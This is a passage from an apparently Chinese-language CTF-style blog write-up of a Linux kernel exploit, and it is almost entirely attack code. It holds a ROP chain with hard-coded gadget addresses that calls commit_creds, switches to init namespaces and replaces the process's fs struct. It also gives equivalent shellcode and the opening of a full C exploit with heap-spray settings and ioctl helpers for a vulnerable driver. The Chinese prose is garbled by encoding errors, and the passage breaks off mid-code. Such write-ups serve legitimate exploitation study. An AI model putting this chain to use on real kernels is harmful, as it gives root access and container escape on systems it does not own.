class="type">uint64_t</span> *)&amp;buff[<span class="number">0x10</span>] = target_object + <span class="number">0x30</span>;             <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x38</span>] = kernel_base + <span class="number">0xffffffff81882840</span>; <span class="comment">// push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x66</span>] = kernel_base + <span class="number">0xffffffff810007a9</span>; <span class="comment">// pop rsp ; ret</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x00</span>] = kernel_base + <span class="number">0xffffffff813c6b78</span>; <span class="comment">// add rsp, 0x78 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP</span></span><br><span class="line">rop = (<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// creds = prepare_kernel_cred(0)   [2]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810ebc90</span>; <span class="comment">// prepare_kernel_cred</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// commit_creds(creds)    [3]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81a05e4b</span>; <span class="comment">// mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810eba40</span>; <span class="comment">// commit_creds</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// task = find_task_by_vpid(1)    [4]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= <span class="number">1</span>;                                <span class="comment">// pid</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e4fc0</span>; <span class="comment">// find_task_by_vpid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// switch_task_namespaces(task, init_nsproxy)    [5]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81a05e4b</span>; <span class="comment">// mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8100051c</span>; <span class="comment">// pop rsi ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8245a720</span>; <span class="comment">// init_nsproxy;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810ea4e0</span>; <span class="comment">// switch_task_namespaces</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// new_fs = copy_fs_struct(init_fs)    [6]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff82589740</span>; <span class="comment">// init_fs;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff812e7350</span>; <span class="comment">// copy_fs_struct;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e6cb7</span>; <span class="comment">// push rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// current = find_task_by_vpid(getpid())    [7]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= getpid();                         <span class="comment">// pid</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e4fc0</span>; <span class="comment">// find_task_by_vpid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// current-&gt;fs = new_fs    [8]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0x6e0</span>;                            <span class="comment">// current-&gt;fs</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8102396f</span>; <span class="comment">// add rax, rcx ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff817e1d6d</span>; <span class="comment">// mov qword ptr [rax], rbx ; pop rbx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kpti trampoline    [9]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81c00ef0</span> + <span class="number">22</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">*rop ++= <span class="number">0</span>;</span><br><span class="line">*rop ++= <span class="number">0</span>;</span><br><span class="line">*rop ++= (<span class="type">uint64_t</span>)&amp;win;</span><br><span class="line">*rop ++= usr_cs;</span><br><span class="line">*rop ++= usr_rflags;</span><br><span class="line">*rop ++= (<span class="type">uint64_t</span>)(<span class="built_in">stack</span> + <span class="number">0x5000</span>);</span><br><span class="line">*rop ++= usr_ss;</span><br></pre></td></tr></table></figure><p>å…¶å¯¹åº”çš„ shellcode å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">  init_cred         = 0x2a76b00</span><br><span class="line">  commit_creds      = 0x1c2670</span><br><span class="line">  find_task_by_vpid = 0x1b8fa0 </span><br><span class="line">  init_nsproxy      = 0x2a768c0</span><br><span class="line">  switch_task_namespaces = 0x1c0ad0</span><br><span class="line">  init_fs                = 0x2bb5320</span><br><span class="line">  copy_fs_struct         = 0x45c0f0</span><br><span class="line">  kpti_bypass            = 0x14011c6</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  lea r15,[rip]</span><br><span class="line">  sub r15, 0x1ab7f0</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid())</span><br><span class="line">  mov rdi, 0x1111111111111111  </span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x828], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_PAGESPRAY 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_FILESPRAY 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_FD 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_FD 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TMP_FD 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> &#123;</span></span><br><span class="line">  u64 len;</span><br><span class="line">  u32 fd;</span><br><span class="line">  u32 fd_flags;</span><br><span class="line">  u64 heap_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1339</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/vda&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span 